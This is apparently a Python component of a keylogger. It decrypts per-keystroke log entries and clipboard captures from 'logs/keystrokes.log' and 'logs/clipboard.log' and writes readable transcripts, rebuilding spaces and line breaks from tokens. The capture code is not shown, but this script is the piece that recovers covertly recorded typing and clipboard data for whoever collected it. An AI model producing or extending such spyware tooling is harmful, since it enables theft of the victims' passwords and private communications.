from encryption import decrypt_data, load_key

def decrypt_file(input_path, output_path, is_clipboard=False):
    key = load_key()
    with open(input_path, "r", encoding="utf-8") as f:
        encrypted_lines = f.readlines()

    decrypted_text = ""

    for line in encrypted_lines:
        line = line.strip()
        if is_clipboard:
            if not line.startswith("[CLIPBOARD]"):
                continue
            encrypted_data = line[len("[CLIPBOARD] "):].strip()
            decrypted_text += decrypt_data(encrypted_data, key) + "\n"
        else:
            decrypted_char = decrypt_data(line, key)
            if decrypted_char == "[space]":
                decrypted_char = " "
            elif decrypted_char == "[enter]":
                decrypted_char = "\n"
            decrypted_text += decrypted_char

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(decrypted_text)

if __name__ == "__main__":
    decrypt_file("logs/keystrokes.log", "logs/keystrokes_decrypted.txt", is_clipboard=False)
    decrypt_file("logs/clipboard.log", "logs/clipboard_decrypted.txt", is_clipboard=True)

    print("Decryption complete! Check the logs folder for decrypted files.")
